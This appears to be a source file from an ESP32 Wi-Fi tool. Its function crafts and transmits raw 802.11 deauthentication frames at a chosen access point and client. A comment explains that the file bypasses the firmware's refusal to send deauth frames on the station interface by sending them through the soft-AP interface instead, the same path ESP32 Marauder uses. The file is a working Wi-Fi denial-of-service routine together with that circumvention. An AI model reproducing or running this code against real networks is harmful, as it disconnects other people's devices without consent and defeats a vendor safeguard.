#include "deauth_tx.h"

#include <esp_wifi.h>

#include "deauth.h"

// Raw-frame TX. On arduino-esp32 2.0.x (ESP-IDF 4.4) the STA interface
// validates outgoing management frames and rejects deauth with
// ESP_ERR_INVALID_ARG — the documented supported set there is only
// beacon / probe request / probe response / action / non-QoS data
// (verified on hardware: every burst came back 0x102). The AP interface
// applies no such check — this is the TX path ESP32 Marauder uses — so
// frames leave through WIFI_IF_AP. Requires WIFI_MODE_APSTA (set in
// scanner.begin) so the softAP control block exists; it never beacons
// because no AP SSID is ever configured.

int deauthTxSend(const uint8_t bssid[6], const uint8_t dest[6], uint16_t seq,
                 uint16_t reason) {
  uint8_t frame[radar::kDeauthLen];
  radar::buildDeauth(frame, bssid, dest, seq, reason);
  const int e = esp_wifi_80211_tx(WIFI_IF_AP, frame, radar::kDeauthLen, false);
  if (e == ESP_OK) return ESP_OK;
  const int e2 =
      esp_wifi_80211_tx(WIFI_IF_AP, frame, radar::kDeauthLen, true);
  return e2 == ESP_OK ? ESP_OK : e;
}